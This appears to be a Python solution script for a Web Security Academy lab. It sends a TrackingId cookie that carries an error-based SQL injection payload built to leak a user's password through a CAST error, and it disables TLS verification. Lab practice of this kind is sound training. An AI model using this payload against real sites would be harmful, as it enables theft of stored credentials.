import http.client
import ssl
import urllib

LAB_ID = "???"


def GET_(
        tracking_id: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    if tracking_id:
        headers['cookie'] = f'TrackingId={urllib.parse.quote_plus(tracking_id)}'
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()

response = GET_("' and 1=CAST((SELECT password FROM users limit 1) AS int)--")
print(response.status)
print(response.headers)
print(response.read().decode('utf-8'))